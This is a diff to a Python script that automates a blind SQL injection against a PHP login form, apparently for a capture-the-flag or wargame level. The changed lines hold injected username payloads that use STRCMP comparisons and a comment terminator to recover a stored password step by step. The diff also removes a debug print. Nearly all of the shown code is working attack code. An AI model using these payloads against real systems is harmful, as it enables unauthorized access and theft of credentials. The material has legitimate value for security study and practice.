@@ -46,10 +46,10 @@ async def query_comparison(session: aiohttp.ClientSession, url: str, username: s
     # relevant source line:
     # `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`
     greater = {
-        "username": f'{username}" and password > "{password}" --'
+        "username": f'{username}" AND STRCMP("{password}",password)=1 #'
     }
     equal = {
-        "username": f'{username}" and password = "{password}" --'
+        "username": f'{username}" AND STRCMP("{password}",password)=0 #'
     }
 
     response_greater = query(session, url, greater)
@@ -67,7 +67,6 @@ async def query_comparison(session: aiohttp.ClientSession, url: str, username: s
 async def query(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
     response = await session.post(url, data=data)
     text = await response.text()
-    print(text)
     return QUERY_SUCCESS_INDICATOR in text
 
 if __name__ == "__main__":
